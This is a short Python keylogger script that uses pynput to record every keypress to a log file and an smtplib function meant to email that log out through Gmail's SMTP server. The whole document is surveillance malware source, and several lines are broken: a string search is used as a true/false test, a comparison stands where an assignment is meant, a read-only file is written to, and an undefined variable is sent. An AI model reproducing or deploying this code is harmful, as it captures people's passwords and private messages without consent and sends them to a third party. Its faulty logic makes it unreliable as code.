from pynput.keyboard import Listener
import re
import smtplib 

def write_to_file(key):
    msg = str(key).replace('\'', '')
    if msg == 'Key.enter':
        msg = '\n'
    elif msg == 'Key.space':
        msg = ' '
    elif msg == 'Key.shift_r':
        msg = ''
    elif msg =='Key.backspace':
        msg = ''
    elif msg.find('Key.'): #Was gonna use reg exp but this was simpler
        msg==''
    elif msg.find('Key.ctrlc'):
        email()
        msg="SCRIPT STOPPED RUNNING HERE."
    with open("log.txt", 'a') as fi:
        fi.write(msg)

def email():
        subject="Logfile"
        try:
            with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
                smtp.ehlo()  # identify ourselves
                smtp.starttls()  # encrypts traffic
                smtp.ehlo()
                smtp.login('', '')  # LOGS IN
                f = open("log.txt", 'r')
                body = f.write()
                msg = f'Subject: {subject}\n\n{body}'
                smtp.sendmail('', '', self.msg)
                f.close()
        except():
            print("Email was not sent successfully...")

with Listener(on_press=write_to_file) as li:
    li.join()

